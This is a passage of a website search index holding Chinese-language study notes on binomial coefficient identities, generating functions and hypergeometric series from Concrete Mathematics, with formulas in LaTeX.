argument)</p>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u52a0\u6cd5\u516c\u5f0f","title":"\u52a0\u6cd5\u516c\u5f0f","text":"<p>\u8bb0\u5fc6\uff1a\u76f4\u89d2\u5750\u6807\u7cfb\u7248\u7684\u6768\u8f89\u4e09\u89d2\u5f62\u4e2d\uff0c\u4e00\u4e2a\u6570\u7b49\u4e8e\u5176\u4e0a\u65b9\u548c\u5de6\u4e0a\u65b9\u7684\u6570\u7684\u548c $$ {r \\choose k} = {r-1 \\choose k-1} + {r-1 \\choose k} $$</p> <ul> <li>\u7ec4\u5408\u89e3\u91ca\uff1a\u5206\u7c7b\u8ba8\u8bba\u5143\u7d20n\u662f\u5426\u88ab\u9009\u4e2d</li> <li>\u53ef\u4ee5\u6309\u7167\u5b9a\u4e49\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u4e24\u4e2a\u5438\u6536\u6052\u7b49\u5f0f\u76f8\u52a0\u5f97\u5230</li> <li>\u52a0\u6cd5\u516c\u5f0f\u53ef\u4ee5\u770b\u4f5c\u662f\u4e00\u4e2a\u9012\u63a8\u5f0f</li> </ul> <p>\u63a8\u8bba\uff0c\u5173\u4e8e\u4e0a\u6307\u6807\u6c42\u548c\uff08 summation on the upper index \uff09\uff0c\u5176\u4e2d\u4e0a\u4e0b\u6307\u6807\u76f8\u5dee\u4e3a\u4e00\u4e2a\u5b9a\u503c\u7684\u548c\u4e5f\u5f88\u91cd\u8981 $$ \\begin{align}     \\sum_{k=0}^{n} {k \\choose m} &amp;= \\sum_{k=m}^{n} {k \\choose k-m}\\         &amp;= \\sum_{l=0}^{r} {m+l \\choose l} &amp;\\text{\\(r = n-m\\)}\\         &amp;= {m+r+1 \\choose r+1} \\         &amp;= {n+1 \\choose m+1} \\end{align} $$</p> <ul> <li> <p>\u7ec4\u5408\u89e3\u91ca\uff1a\u5982\u679c\u6211\u4eec\u60f3\u8981\u4ece\u4e00\u4e2a\u6709 1 + n\u5f20\u7968\uff08\u6807\u53f7\u4ece 0 \u76f4\u5230n\uff09\u7684\u96c6\u5408\u4e2d\u9009\u53d6m +1 \u5f20\u7968\uff0c\u5f53\u9009\u53d6\u7684\u6700\u5927\u53f7\u7801\u662f\u6570k\u65f6\u5c31\u6709\\(k \\choose m\\)\u79cd\u53d6\u6cd5</p> </li> <li> <p>\u548c\u4e0b\u964d\u5e42\u516c\u5f0f\u7684\u8054\u7cfb\uff08\u5c06\u4e0b\u5f0f\u4e24\u8fb9\u9664\u4ee5m!\uff09   $$   \\sum_{0\\le k \\le n} k^{\\underline m} = {(n+1)^{\\underline{m+1}} \\over m+1}   $$</p> </li> </ul>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u4e8c\u9879\u5f0f\u5b9a\u7406","title":"\u4e8c\u9879\u5f0f\u5b9a\u7406","text":"<ul> <li> <p>binomial theorem   $$   (x+y)^r = \\sum_k {r \\choose k} x^k y^{r-k} \\text{\u6574\u6570\\(r\\ge0\\)\u6216\u8005\\(|x/y|&lt;1\\)}   $$</p> </li> <li> <p>r\u4e0d\u662f\u975e\u8d1f\u6574\u6570\u65f6   $$   (1+z)^r = \\sum_k {r \\choose k} z^k, |z|&lt;1   $$</p> </li> <li> <p>\u4f7f\u7528\u6cf0\u52d2\u7ea7\u6570\u57280\u5904\u5c55\u5f00\uff0c\u53ef\u4ee5\u8bc1\u660e\u8be5\u516c\u5f0f\uff08\u7ec4\u5408\u89e3\u91ca\u53ea\u8bf4\u660e\u4e86r\u662f\u975e\u8d1f\u6574\u6570\u7684\u60c5\u51b5\uff09</p> </li> </ul>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u53cd\u8f6c\u4e0a\u6307\u6807","title":"\u53cd\u8f6c\u4e0a\u6307\u6807","text":"<p>negating the upper index  $$ {r \\choose k} = (-1)^k {k-r-1 \\choose k} \\ r^{\\underline{k}} = r(r-1)...(r-k+1) =\\  (-1)^k (-r)(1-r)..(k-1-r) = (-1)^k (k-1-r)^{\\underline{k}}\\</p> <p>$$</p>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u4e8c\u9879\u5f0f\u7cfb\u6570\u6c42\u548c","title":"\u4e8c\u9879\u5f0f\u7cfb\u6570\u6c42\u548c","text":"<p>\u4e8c\u9879\u5f0f\u7cfb\u6570\u7684\u6052\u7b49\u5f0f\u975e\u5e38\u591a\uff0c\u8bb0\u4e0d\u5b8c\u7684\u3002\u89c1\u88685-3\u4e8c\u9879\u5f0f\u7cfb\u6570\u4e58\u79ef\u548c\u3002</p> <p>\u5176\u4e2d\u91cd\u8981\u7684\uff0c\u89c1\u4e66\u4e0ap143\u9875\u88685-4\u768412\u4e2a\u6700\u91cd\u8981\u7684\u4e8c\u9879\u5f0f\u7cfb\u6570\u6052\u7b49\u5f0f</p> <p>\u5728\u8bc1\u660e\u4e00\u4e9b\u6052\u7b49\u5f0f\u65f6\uff0c\u52a0\u6cd5\u516c\u5f0f\u548c\u6570\u5b66\u5f52\u7eb3\u6cd5\u7ed3\u5408\u7684\u5f88\u597d</p>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u8303\u5fb7\u8499\u5377\u79ef","title":"\u8303\u5fb7\u8499\u5377\u79ef","text":"\\[ \\sum_k {r \\choose m+k}{s \\choose n-k} = {r+s \\choose m+n} \\\\ \\sum_k {r \\choose k}{s \\choose n-k} = {r +s\\choose n} \\] <p>\u7ec4\u5408\u89e3\u91ca\uff1ar+s\u96c6\u5408\u5206\u4e3ar\u548cs\u4e24\u7c7b</p>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u6700\u91cd\u8981\u768412\u4e2a\u6052\u7b49\u5f0f","title":"\u6700\u91cd\u8981\u768412\u4e2a\u6052\u7b49\u5f0f","text":"","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u57fa\u672c\u7ec3\u4e60","title":"\u57fa\u672c\u7ec3\u4e60","text":"<p>\u95ee\u98981\uff1a\u6bd4\u503c\u7684\u548c\u5f0f $$ \\begin{align}     \\sum_{k=0}^{m} {m \\choose k}/{n \\choose k} &amp; = \\sum_{k \\ge 0} {n - k \\choose m - k}/{n \\choose m}\\         &amp;= 1/{n \\choose m}\\sum_{k \\le m} {n - m + k \\choose k}\\         &amp;= {n+1 \\choose m} /{n \\choose m} \\         &amp;= \\frac{n+1}{n+1-m} \\end{align} $$ \u95ee\u98982\uff1a $$ \\begin{align}     \\sum_{k=0}^{n} k{m -k - 1 \\choose m - n - 1} &amp; = \\sum_{k=0}^{n} (m - (m-k)){m -k - 1 \\choose m - n - 1}\\         &amp;= \\sum_{k=0}^{n} m{m -k - 1 \\choose m - n - 1} - \\sum_{k=0}^{n} (m-k){m -k - 1 \\choose m - n - 1}\\ \\end{align} $$ \u95ee\u98986\uff1a</p> <p>\\(n \\ge 0\\) $$ \\begin{align}     \\sum_{k\\ge0} {n+k \\choose 2k}{2k \\choose k}\\frac{(-1)^k}{k+1} &amp; = \\sum_{k\\ge0}{n+k \\choose k}{n \\choose k}\\frac{(-1)^k}{k+1}\\         &amp;= \\sum_{k\\ge0}{n+k \\choose k}{n+1 \\choose k+1}\\frac{(-1)^k}{n+1}\\ \\end{align} $$ \u5bf9\u79f0\u6027 $$ \\begin{align}     \\sum_{k\\ge0}{n+k \\choose k}{n+1 \\choose k+1}\\frac{(-1)^k}{n+1} &amp;= \\sum_{k}{n+k \\choose k}{n+1 \\choose k+1}\\frac{(-1)^k}{n+1}\\          &amp;= \\sum_{k}{n+k \\choose n}{n+1 \\choose k+1}\\frac{(-1)^k}{n+1}\\         &amp;= 0 \\end{align} $$ \u4ece\\({n+k \\choose k}\u53d8\u4e3a{n+k \\choose n}\\)\uff0c\u5f53\\(k&lt;-n\\)\u65f6\uff0c\u4f1a\u4ece\u4e00\u4e2a\u96f6\u503c\u53d8\u4e3a\u4e00\u4e2a\u975e\u96f6\u503c\u3002\u4f46\u662f\u7531\u4e8e\u53e6\u4e00\u9879\\({n+1 \\choose k+1}\\)\u5728\\(k&lt;-n\\)\u65f6\u4e3a0\uff0c\u9664\u4e86\\(n=0\\)\u65f6\\(k=-1\\)\u7684\u60c5\u51b5\u4e3a1\uff0c\u56e0\u6b64\u7b54\u6848\u4e3a\\(0 - {-1 \\choose 0}(-1)^{-1} = 1\\)</p> <p>\u6216\u5219\u76f4\u63a5\u5229\u7528\u53cd\u8f6c\u4e0a\u6307\u6807</p>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u5904\u7406\u7684\u6280\u5de7","title":"\u5904\u7406\u7684\u6280\u5de7","text":"","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u53d6\u4e00\u534a","title":"\u53d6\u4e00\u534a","text":"\\[ \\begin{equation}     r^{\\underline{k}}(r-\\frac{1}{2})^{\\underline{k}}=(2 r)^{\\underline{2k}} / 2^{2 k} \\text {, \u6574\u6570 } k \\geqslant 0 \\end{equation} \\] \\[ \\begin{equation}     {r \\choose k}{r-1 / 2 \\choose k}={2 r \\choose 2 k}{2 k \\choose k} / 2^{2 k}, k \\text { \u662f\u6574\u6570. } \\end{equation} \\] \\[ \\begin{equation}     {n-1 / 2 \\choose n}={2 n \\choose n} / 2^{2 n}, n \\text { \u662f\u6574\u6570. } \\end{equation} \\] \\[ \\begin{equation}     {-1 / 2 \\choose n}=\\left(\\frac{-1}{4}\\right)^{n}{2 n \\choose n}, n \\text { \u662f\u6574\u6570. } \\end{equation} \\] \\[ (2n-1)!! 2^nn!= (2n)! \\] <p>\u53ef\u4ee5\u77e5\u9053\uff0c\u5f53\u4e0a\u6307\u6807\u975e\u6574\u6570\u65f6\uff0c\u53d6\u503c\u5f88\u7279\u522b\u3002</p>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u9ad8\u9636\u5dee\u5206","title":"\u9ad8\u9636\u5dee\u5206","text":"\\[ \\begin{equation} \\Delta^{n}=(\\mathrm{E}-1)^{n}=\\sum_{k}{n \\choose k} \\mathrm{E}^{k}(-1)^{n-k} \\end{equation} \\] <p>\u5373 $$ \\sum_{k} {n \\choose k}(-1)^{n-k}f(x+k) = \\Delta^{n}f(x) $$ \u6216\\(\\sum_{0}^{n} {n \\choose k}(-1)^{k}f(x+k) = (-1)^n \\Delta^{n}f(x)\\)</p> <p>\u6216\\(\\sum_{0}^{n} {n \\choose k}(-1)^{k}f(k) = (-1)^n \\Delta^{n}f(0)\\)</p>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u725b\u987f\u7ea7\u6570","title":"\u725b\u987f\u7ea7\u6570","text":"<p>\u5047\u5982f(x)\u662f\u4e00\u4e2ad\u6b21\u591a\u9879\u5f0f\uff0c\u5219f(x)\u53ef\u4ee5\u5199\u6210\u4e0b\u964d\u5e42\u7684\u548c\u5f0f $$ f(x) = b_dx^{\\underline{d}} + b_{d-1}x^{\\underline{d-1}}+...+b_1x^{\\underline{1}} + b_0x^{\\underline{0}} $$ \u66f4\u8fdb\u4e00\u6b65\uff0c\u53ef\u4ee5\u5199\u6210\u4e8c\u9879\u5f0f\u7cfb\u6570\u7684\u548c $$ f(x) = c_d{x \\choose d} + c_{d-1}{x \\choose d-1}+...+c_{0}{x \\choose 0} $$</p> <p>\u53ef\u4ee5\u901a\u8fc7\u8ba1\u7b97\u9ad8\u9636\u5dee\u5206\uff0c\u6c42\u89e3\u8fd9\u4e9b\u7cfb\u6570\u3002\u7c7b\u4f3c\u4e8e\u6cf0\u52d2\u5c55\u5f00\u3002 $$ \\Delta^{n} {x \\choose d} = {x \\choose d-n} $$</p> \\[ \\begin{equation} f(x)=\\Delta^{d} f(0){x \\choose d}+\\Delta^{d-1} f(0){x \\choose d-1}+\\cdots+\\Delta f(0){x \\choose 1}+f(0){x \\choose 0} \\end{equation} \\] \\[ \\begin{equation}     g(a+x)=\\frac{g(a)}{0 !} x^{\\underline{0}}+\\frac{\\Delta g(a)}{1 !} x^{\\underline{1}}+\\frac{\\Delta^{2} g(a)}{2 !} x^{\\underline{2}}+\\frac{\\Delta^{3} g(a)}{3 !} x^{\\underline{3}}+\\cdots \\end{equation} \\] <p>\u6bd4\u5982\u8981\u8ba1\u7b97\\(f(x) = x^3\\)\u7684\u725b\u987f\u7ea7\u6570 $$ f(0) = 0, f(1) = 1, f(2) = 8, f(3) = 27\\ \\Delta f(0) = 1, \\Delta f(1) = 7, \\Delta f(2) = 19,\\ \\Delta^2 f(0) = 6, \\Delta f(1) = 12,\\ \\Delta^3 f(0) = 6, $$ \u56e0\u6b64\\(x^3 = 6{x \\choose 3} + 6{x \\choose 2} + {x \\choose 1}\\)</p> <p>\u56e0\u6b64\\(\\sum_{k=0}^{n-1} k^3 = 6{n \\choose 4} + 6{n \\choose 3} + {n \\choose 2}\\)</p>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u53cd\u6f14","title":"\u53cd\u6f14","text":"\\[ \\begin{equation}     g(n)=\\sum_{k}{n \\choose k}(-1)^{k} f(k) \\Leftrightarrow f(n)=\\sum_{k}{n \\choose k}(-1)^{k} g(k) \\end{equation} \\] <p>\u4e66\u672cp159\u5904\\(f(k) = {r - sk \\choose n} = \\frac{1}{n!}(-n)^n...\\)\u4e2d\u7684\\((-n)^n\\)\u5e94\u8be5\u662f\\((-1)^n\\)\uff0c\u5370\u5237\u9519\u8bef\u3002</p>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u751f\u6210\u51fd\u6570","title":"\u751f\u6210\u51fd\u6570","text":"<p>\u5377\u79ef</p> <p>\u751f\u6210\u51fd\u6570\u8ba1\u7b97</p> <p>B_2(z)\u7684\u7cfb\u6570\u4e3a\u5361\u5854\u5170\u6570Catalan number C_n</p>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u5e7f\u4e49\u4e8c\u9879\u7ea7\u6570\u548c\u5e7f\u4e49\u6307\u6570\u7ea7\u6570","title":"\u5e7f\u4e49\u4e8c\u9879\u7ea7\u6570\u548c\u5e7f\u4e49\u6307\u6570\u7ea7\u6570","text":"\\[ \\begin{equation}     \\mathcal{B}_{t}(z)=\\sum_{k \\geqslant 0}(t k)^{\\frac{k-1}{}} \\frac{z^{k}}{k !} ; \\quad \\mathcal{E}_{t}(z)=\\sum_{k \\geqslant 0}(t k+1)^{k-1} \\frac{z^{k}}{k !} \\end{equation} \\]","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u4e00\u822c\u5377\u79ef\u516c\u5f0f","title":"\u4e00\u822c\u5377\u79ef\u516c\u5f0f","text":"<ul> <li>\u6709\uff085.60\uff09</li> </ul> \\[ \\begin{aligned}     \\mathcal{B}_{t}(z)^{r}=\\sum_{k \\geqslant 0}{t k+r \\choose k} \\frac{r}{t k+r} z^{k} ; \\\\     &amp; \\mathcal{E}_{t}(z)^{r}=\\sum_{k \\geqslant 0} r \\frac{(t k+r)^{k-1}}{k !} z^{k} ;     \\end{aligned} $$ \u53ef\u8bb0\u5176\u4e2d\u7684\u7cfb\u6570\uff1a $$ C_{k}^{(t,r)} = {tk+r \\choose k}\\frac{1}{tk+r} \\] <p>\u5982 $$ (t k)^{\\underline{k-1}}\\frac{1}{k!} = (tk+1)^{\\underline{k}}/(tk+1)\\frac{1}{k!} = C_k^{(t, 1)} $$ \u4e4b\u540e\u4f1a\u8bc1\u660e\uff1a $$ [z^k]\\mathcal{B}_t(z) = [z^{k-1}]\\mathcal{B}_t(z)^t $$</p> <ul> <li>\u53c8\u6709(5.61)</li> </ul> \\[ \\begin{aligned}     \\frac{\\mathcal{B}_{t}(z)^{r}}{1-t+t \\mathcal{B}_{t}(z)^{-1}}=\\sum_{k \\geqslant 0}{t k+r \\choose k} z^{k} ; \\\\     &amp; \\frac{\\mathcal{E}_{t}(z)^{r}}{1-z t \\mathcal{E}_{t}(z)^{t}}=\\sum_{k \\geqslant 0} \\frac{(t k+r)^{k}}{k !} z^{k} .     \\end{aligned} \\] <p>\u6784\u9020\u751f\u6210\u51fd\u6570\\(\\mathcal{B}_{t}(z)^{r}  \\frac{\\mathcal{B}_{t}(z)^{s}}{1-t+t \\mathcal{B}_{t}(z)^{-1}}\\)\uff0c\u5f97\u4e00\u822c\u5377\u79ef\u516c\u5f0f(5.62)\uff1a $$ \\begin{equation}     \\sum_{k}{t k+r \\choose k}{t n-t k+s \\choose n-k} \\frac{r}{t k+r}={t n+r+s \\choose n} \\end{equation} $$</p>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u7279\u6b8a\u7ea7\u6570sqrt1pm4z","title":"\u7279\u6b8a\u7ea7\u6570\\(\\sqrt{1\\pm4z}\\)","text":"","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#b_2\u5c01\u95ed\u5f62\u5f0f568\u4e66\u4e0a\u6ca1\u6709\u8bc1\u660e","title":"B_2\u5c01\u95ed\u5f62\u5f0f(5.68)\uff08\u4e66\u4e0a\u6ca1\u6709\u8bc1\u660e\uff09","text":"\\[ \\mathcal{B}_{2}(z)=\\sum_{k}{2 k \\choose k} \\frac{z^{k}}{1+k}=\\sum_{k}{2 k+1 \\choose k} \\frac{z^{k}}{1+2 k}=\\frac{1-\\sqrt{1-4 z}}{2 z} $$ \u8bc1\u660e\uff1a $$ \\begin{align} \\sqrt{1-4z} &amp;= (1-4z)^{1/2}\\\\     &amp;=\\sum_{k\\ge 0}{1/2 \\choose k}(-4z)^k \\\\     &amp;{\\text{\u6709${-1/2 \\choose k} = (-1/4)^k{2k \\choose k}$}}\\\\     &amp;= \\sum_{k\\ge 0}\\frac{1/2(1/2-1)...}{k!}(-4z)^k \\\\     &amp;= 1+\\sum_{k\\ge 1}\\frac{1}{2k}\\frac{(-1/2)^{\\underline{k-1}}}{(k-1)!}(-4z)^k \\\\     &amp;= 1 + \\sum_{k\\ge 1}{-1/2 \\choose k-1}(-4z)^k \\\\     &amp;= 1 + \\sum_{k\\ge 0}{-1/2 \\choose k}(-4z)^{k+1} \\\\     &amp;= 1 - 2z\\sum_{k\\ge 0}{2 k \\choose k}\\frac{1}{k+1}z^k     &amp;= 1 - 2zB_2(z) \\end{align} \\] <p>\u8bc1\u660e(5.72) $$ \\begin{equation}     \\frac{\\mathcal{B}{2}(z)^{r}}{\\sqrt{1-4 z}}=\\sum{k}{2 k+r \\choose k} z^{k} \\end{equation} $$ \u8bc1\u660e\uff1a</p> <p>\u6709\uff08\u7c7b\u4f3c\u4e8e\u4e0a\u9762\u8bc1\u660e\uff09 $$ \\frac{1}{\\sqrt{1-4z}} = \\sum_{k}{2k \\choose k} z^k $$ \u6784\u9020\u751f\u6210\u51fd\u6570\\(\\mathcal{B}_{2}(z)^{r} \\frac{1}{\\sqrt{1-4z}}\\)\uff0c\u518d\u7531\u4e00\u822c\u5377\u79ef\u516c\u5f0f\u53ef\u5f97\u3002</p> <p>\u7c7b\u4f3c\u53ef\u5f97(5.73) $$ \\begin{equation}     \\frac{\\mathcal{B}{-1}(z)^{r+1}}{\\sqrt{1+4 z}}=\\sum{k}{r-k \\choose k} z^{k} \\end{equation} $$ \u8bc1\u660e(5.74) $$ \\begin{equation}     \\sum_{k \\leqslant n}{n-k \\choose k} z^{k}=\\frac{1}{\\sqrt{1+4 z}}\\left(\\left(\\frac{1+\\sqrt{1+4 z}}{2}\\right)^{n+1}-\\left(\\frac{1-\\sqrt{1+4 z}}{2}\\right)^{n+1}\\right) \\text {, \u6574\u6570 } n \\geqslant 0 \\end{equation} $$ \u8bc1\u660e\uff1a</p> <p>\u53ef\u8bc1\u660ek&gt;n\u65f6 $$ [z^k]\\frac{(-z)^{n+1}\\mathcal{B}{2}(-z)^{n+1}}{\\sqrt{1+4 z}} = {n-k \\choose k} $$ \uff0c\u6545 $$ \\begin{equation} \\frac{\\mathcal{B}{-1}(z)^{n+1}-(-z)^{n+1} \\mathcal{B}{2}(-z)^{n+1}}{\\sqrt{1+4 z}}=\\sum{k \\leqslant n}\\left(\\begin{array}{c} n-k \\ k \\end{array}\\right) z^{k} \\end{equation} $$</p>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u8d85\u51e0\u4f55\u51fd\u6570","title":"\u8d85\u51e0\u4f55\u51fd\u6570","text":"\\[ \\begin{equation}     F\\left(\\left.\\begin{array}{c}     a_{1}, \\cdots, a_{m} \\\\     b_{1}, \\cdots, b_{n}     \\end{array}\\right| z\\right)=\\sum_{k \\geqslant 0} \\frac{a_{1}^{\\bar{k}} \\cdots a_{m}^{\\bar{k}} z^{k}}{b_{1}^{\\bar{k}} \\cdots b_{n}^{\\bar{k}} k !} \\end{equation} \\] <ul> <li> <p>\u5e26\u6709m\u4e2a\u4e0a\u53c2\u6570\uff0cn\u4e2a\u4e0b\u53c2\u6570\u3002\u5bf9\u4e8e\u53c2\u6570\u4e2a\u6570\u4e3a0\u7684\u60c5\u51b5\uff0c\u53ef\u4ee5\u4e0a\u4e0b\u6dfb\u52a0\u4e00\u4e2a\u5e38\u65701\u800c\u4e0d\u4f1a\u5f71\u54cd\uff08\u53c2\u6570\u4e2a\u6570\u4ecd\u7136\u662f0\u4e2a\uff09\u3002</p> </li> <li> <p>\u5982m=1, n=0\u7684\u60c5\u51b5\u5bf9\u5e94</p> </li> </ul> \\[ \\begin{equation}     F\\left(\\begin{array}{c}     a, 1 \\\\     1     \\end{array} \\mid z\\right)=\\sum_{k \\geqslant 0} a^{\\bar{k}} \\frac{z^{k}}{k !}=\\sum_{k}{a+k-1 \\choose k} z^{k}=\\frac{1}{(1-z)^{a}} \\end{equation} \\] <ul> <li>m=0, n=1\u4e3a\u4fee\u6b63\u8d1d\u585e\u5c14\u51fd\u6570\uff08 modified Bessel function \uff09</li> </ul> \\[ \\begin{equation}     F\\left(\\begin{array}{c}     1 \\\\     b, 1     \\end{array} \\mid z\\right)=\\sum_{k \\geqslant 0} \\frac{(b-1) !}{(b-1+k) !} \\frac{z^{k}}{k !}=I_{b-1}(2 \\sqrt{z}) \\frac{(b-1) !}{z^{(b-1) / 2}} \\end{equation} \\] <ul> <li>m=1, n=1\u4e3a\u5408\u6d41\u8d85\u51e0\u4f55\u7ea7\u6570\uff08 confluent hypergeometric series \uff09 </li> </ul> \\[ \\begin{equation}     F\\left(\\begin{array}{l}     a \\\\     b     \\end{array} \\mid z\\right)=\\sum_{k \\geqslant 0} \\frac{a^{\\bar{k}}}{b^{\\bar{k}}} \\frac{z^{k}}{k !}=M(a, b, z) . \\end{equation} \\] <ul> <li>\u800cm=2, n=1\u88ab\u79f0\u4e3a\u9ad8\u65af\u8d85\u51e0\u4f55\u51fd\u6570</li> </ul> <p>\u4eca\u5929\uff0c\u5728\u8bb8\u591a\u5927\u5b66 \u7684\u7269\u7406\u5b66\u3001\u5de5\u7a0b\u5b66\u751a \u81f3\u6570\u5b66\u4e13\u4e1a\u7684\u5b66\u751f \u6240\u5b66\u4e60\u7684\u51fd\u6570\u4e2d\uff0c\u5373 \u4f7f\u4e0d\u662f 100% \uff0c \u4e5f\u5fc5\u5b9a \u6709 95% \u7684\u51fd\u6570\u88ab\u8fd9\u5355 \u4e2a\u7684\u7b26\u53f7F ( a , b ; c ; x ) \u6240\u6db5\u76d6\uff0e\u201d   \u2014\u2014 W.W. \u7d22\u8036 [318]</p> \\[ \\begin{equation}     \\left.F\\left(\\begin{array}{c}     a, b \\\\     c     \\end{array}\\right| z\\right)=\\sum_{k \\geqslant 0} \\frac{a^{\\bar{k}} b^{\\bar{k}} z^{k}}{c^{\\bar{k}} k !} . \\end{equation} \\] <p>\u200b   \u6709\u975e\u5e38\u591a\u7684\u6027\u8d28\uff0c\u5982 $$ \\begin{align}     \\ln (1+z)=z F\\left(\\begin{array}{c}     1,1 \\     2     \\end{array} \\mid-z\\right) &amp;=z \\sum_{k \\geqslant 0} \\frac{k ! k !}{(k+1) !} \\frac{(-z)^{k}}{k !} \\     &amp;=z-\\frac{z^{2}}{2}+\\frac{z^{3}}{3}-\\frac{z^{4}}{4}+\\cdots \\end{align} $$</p>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u8d85\u51e0\u4f55\u51fd\u6570\u8868\u793a","title":"\u8d85\u51e0\u4f55\u51fd\u6570\u8868\u793a","text":"<p>\u8d85\u51e0\u4f55\u7ea7\u6570\u6070\u597d\u5c31\u662f\u9996\u9879\u4e3a 1 \u4e14\u9879\u7684\u6bd4\u503c t k+1 /t k \u662f k \u7684\u6709\u7406\u51fd\u6570\u7684\u90a3\u4e9b\u7ea7\u6570 $$ \\begin{equation}     \\begin{aligned}     \\frac{t_{k+1}}{t_{k}} &amp;=\\frac{a_{1}^{\\overline{k+1}} \\cdots a_{m}^{\\overline{k+1}}}{a_{1}^{\\bar{k}} \\cdots a_{m}^{\\bar{k}}} \\frac{b_{1}^{\\bar{k}} \\cdots b_{n}^{\\bar{k}}}{b_{1}^{\\overline{k+1}} \\cdots b_{n}^{\\overline{k+1}}} \\frac{k !}{(k+1) !} \\frac{z^{k+1}}{z^{k}} \\     &amp;=\\frac{\\left(k+a_{1}\\right) \\ldots\\left(k+a_{m}\\right) z}{\\left(k+b_{1}\\right) \\ldots\\left(k+b_{n}\\right)(k+1)}     \\end{aligned} \\end{equation} $$</p>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u5e73\u884c\u6c42\u548c\u8868\u793a\u4e3a\u8d85\u51e0\u4f55\u51fd\u6570","title":"\u5e73\u884c\u6c42\u548c\u8868\u793a\u4e3a\u8d85\u51e0\u4f55\u51fd\u6570","text":"<p>\u5e73\u884c\u6c42\u548c\uff1a $$ \\sum_{k\\le n} {r+k \\choose k} = \\sum_{k\\ge 0}{r +n -k \\choose n-k} = {r+n+1 \\choose n} $$ \u800c $$ \\frac{t_{k+1}}{t_k}= \\frac{(k+1)(k-n)(1)}{(k-n-r)(k+1)} \\ t_0 = {r+n \\choose n} $$ \u6545 $$ {r+n \\choose n} F(1, -n; -n-r; 1) = {r+n+1 \\choose n} $$ \u5373 $$ F(1, -n; -n-r; 1)=\\frac{r+n+1}{r+1} $$ \u7c7b\u4f3c\u7684\u53e6\u4e00\u4e2a\u6c42\u548c\u4e5f\u53ef\u4ee5\u8868\u793a\u4e3a\u8d85\u51e0\u4f55\u51fd\u6570\uff1a $$ \\sum_{k\\le m} {r \\choose k}(-1)^k = F(1, -m; -m+r+1; 1) $$ \u8fd9\u4e24\u4e2a\u8d85\u51e0\u4f55\u7ea7\u6570\u5747m=1, n=1\uff0c\u53ef\u4ee5\u76f8\u4e92\u63a8\u51fa\u3002</p>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u4e24\u4e2a\u9650\u5236","title":"\u4e24\u4e2a\u9650\u5236","text":"<ul> <li>\u4e0b\u53c2\u6570\u4e0d\u80fd\u4e3a0\u6216\u8005\u8d1f\u6574\u6570</li> </ul> 